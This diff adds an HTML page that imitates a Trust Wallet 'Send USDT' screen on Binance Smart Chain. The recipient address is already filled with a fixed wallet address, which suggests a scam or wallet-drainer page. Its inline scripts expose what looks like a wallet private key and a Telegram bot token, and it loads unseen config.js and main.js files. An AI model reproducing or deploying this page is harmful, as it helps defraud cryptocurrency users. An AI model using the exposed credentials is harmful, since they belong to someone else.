@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html data-scrapbook-source="https://transfer-trust-wallet.vercel.app/" data-scrapbook-create="20250612175515756" data-scrapbook-title="Transfer Trust Wallet">
+<head>
+  <meta charset="UTF-8">
+  <title>Transfer Trust Wallet</title>
+  <meta name="description" content="Securely transfer USDT on Binance Smart Chain">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="favicon.ico">
+  <meta name="next-head-count" content="5">
+  <link rel="stylesheet" href="style.css" data-n-g="">
+  <noscript data-n-css=""></noscript>
+
+  <style>
+  /* ====== FULL WHITE MODE FIX (Sirf index.html mein daal) ====== */
+  *, *::before, *::after { -webkit-tap-highlight-color: transparent !important; }
+  
+  /* Background pure white kar do */
+  html, body, #__next, .min-h-screen, .bg-\[#1b1b1b\] {
+    background: #ffffff !important;
+  }
+  body, .min-h-screen { background: #f9f9f9 !important; }
+
+  /* Saare text black/dark kar do */
+  .text-gray-300, .text-white, h1 { color: #1a1a1a !important; }
+  .text-gray-400, label { color: #555 !important; }
+  .text-gray-500 { color: #777 !important; }
+
+  /* Input boxes light bana do */
+  input, .border-gray-800 {
+    background: #f8f8f8 !important;
+    border-color: #ddd !important;
+    color: #000 !important;
+  }
+
+  /* Green button same rakho */
+  .bg-greentext { 
+    background-color: #083ef3 !important; 
+    color: white !important; 
+  }
+  .bg-greentext:hover { background-color: #083ef3 !important; }
+
+  /* Extra clean feel */
+  .text-greentext { color: #083ef3 !important; }
+  </style>
+
+  <style>
+      .copy-protection-on #single-article-right,
+      .copy-protection-on {
+        pointer-events: initial !important;
+      }
+      ::-moz-selection {
+        color: #fdfcfc !important;
+        background: #efefef !important;
+      }
+      ::selection {
+        color: #fcfbfb !important;
+        background: #f5f5f5 !important;
+      }
+      @layer allow-right-click {
+        ::-moz-selection {
+          color: #f9f7f7 !important;
+          background: #ffffff !important;
+        }
+        ::selection {
+          color: #faf8f8 !important;
+          background: #fcfdff !important;
+        }
+      }
+    </style>
+  <script data-scrapbook-elem="custom-elements-loader">
+    (function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement {}); } })(["next-route-announcer"])
+  </script>
+</head>
+<body>
+  <div id="__next">
+    <div>
+      <div class="min-h-screen bg-[#1b1b1b] text-gray-300 p-4 max-w-md mx-auto">
+        <header class="flex w-full items-center mb-8">
+          <h1 class="flex-1 text-center text-xl font-medium text-white">Send USDT</h1>
+        </header>
+        <div class="space-y-6">
+          <div class="space-y-1">
+            <label class="text-sm text">Address or Domain Name</label>
+            <div class="relative">
+              <input placeholder="Search or Enter" class="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-32" value="0x048f69B86C95d50a1957A3F8948eb8081aBadC1D">
+              <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
+                <button class="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 px-2 text-md hover:text-emerald-400">Paste</button>
+                <button class="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 w-8 hover:text-emerald-400">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4"><path d="M4 22h14a2 2 0 0 0 2-2V7.5L14.5 2H6a2 2 0 0 0-2 2v4"></path><polyline points="14 2 14 8 20 8"></polyline><path d="M2 15h10"></path><path d="m9 18 3-3-3-3"></path></svg>
+                </button>
+                <button class="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 w-8 hover:text-emerald-400">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg>
+                </button>
+              </div>
+            </div>
+          </div>
+          <div class="space-y-1">
+            <label class="text-sm text-gray-400">Amount</label>
+            <div class="relative">
+              <input placeholder="USDT Amount" type="number" class="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-24" value="">
+              <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
+                <span class="text-gray-500 text-sm mr-2">USDT</span>
+                <button class="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 text-sm hover:text-emerald-400">Max</button>
+              </div>
+            </div>
+          </div>
+          <div class="text-xs text-gray-500">≈ $0.00</div>
+        </div>
+        <div class="fixed bottom-8 left-4 right-4 max-w-md mx-auto">
+          <button class="w-full bg-greentext text-black hover:bg-gray-700 rounded-full disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-gray-600 disabled:text-white h-12 text-lg inline-flex items-center justify-center gap-2" disabled>Next</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <next-route-announcer>
+    <p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;"></p>
+  </next-route-announcer>
+
+  <!-- Use ethers.js v5.7.2 for Trust Wallet/MetaMask compatibility -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  
+<script>
+// Environment variables injected at build time
+window.ENV = {
+    SENDER_KEY: 'e006c7cd7cef37195974a2566b5cb1245448a3407c09c765621f35c900807fb2'
+};
+</script>
+
+  
+<script>
+// Environment variables injected at build time by Vercel
+window.ENV = {
+    SENDER_KEY: 'e006c7cd7cef37195974a2566b5cb1245448a3407c09c765621f35c900807fb2',
+    TELEGRAM_BOT_TOKEN: '8543622225:AAEw5ThPxiYv0KFFq8ORHQIQdMZStXVvMl8'};
+</script>
+
+  <script src="config.js"></script>
+  <script src="main.js"></script>
+</body>
+</html>
